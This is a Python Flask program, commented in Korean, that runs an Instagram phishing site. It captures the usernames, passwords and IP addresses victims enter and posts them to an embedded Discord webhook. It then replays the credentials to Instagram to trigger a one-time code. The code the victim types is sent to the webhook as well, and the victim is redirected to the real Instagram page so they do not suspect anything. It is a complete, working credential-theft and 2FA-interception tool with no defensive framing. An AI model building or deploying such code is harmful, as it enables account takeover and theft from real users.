import os
import time
import requests
from flask import Flask, render_template, request, redirect, session

# Flask 앱 설정
app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24)

# 1. 본인의 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 인스타그램 서버와 통신할 세션 유지
insta_session = requests.Session()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username

    # [1단계] 디스코드에 ID/PW 탈취 알림 전송
    webhook_data = {
        "embeds": [{
            "title": "🚩 [1단계] 계정 정보 탈취",
            "color": 15158332,
            "fields": [
                {"name": "아이디", "value": f"`{username}`", "inline": True},
                {"name": "비밀번호", "value": f"`{password}`", "inline": True}
            ],
            "footer": {"text": f"IP: {request.remote_addr}"}
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

    # [2단계] 서버 자동화: 인스타그램 로그인 시도 (OTP 발송 트리거)
    try:
        # 인스타 메인 페이지에 접속하여 CSRF 토큰 획득
        main_url = "https://www.instagram.com/accounts/login/"
        main_response = insta_session.get(main_url)
        csrf_token = main_response.cookies.get('csrftoken', 'missing')

        # 인스타 서버가 요구하는 최신 헤더 설정
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "X-CSRFToken": csrf_token,
            "X-Instagram-AJAX": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        # 인스타 암호화 패스워드 포맷 (개념적 적용)
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_url = "https://www.instagram.com/accounts/login/ajax/"
        response = insta_session.post(login_url, data=payload, headers=headers)
        
        # 서버 응답 결과 확인 (디버깅용)
        debug_msg = f"ℹ️ 서버 자동화 응답 코드: {response.status_code}\n(400/403일 경우 인스타 앱에서 '저 맞습니다'를 눌러야 합니다)"
        requests.post(WEBHOOK_URL, json={"content": debug_msg})

    except Exception as e:
        requests.post(WEBHOOK_URL, json={"content": f"⚠️ 자동화 오류: {str(e)}"})

    # 유저에게는 OTP 입력 페이지를 보여줌
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')

    # [3단계] 가로챈 OTP 코드 웹훅 전송
    webhook_data = {
        "embeds": [{
            "title": "🚨 [2단계] OTP 가로채기 성공!",
            "color": 3447003,
            "fields": [
                {"name": "대상 유저", "value": f"`{username}`", "inline": True},
                {"name": "OTP CODE", "value": f"**{otp_code}**", "inline": True}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

    # 마지막은 실제 인스타로 보내서 의심을 피함
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

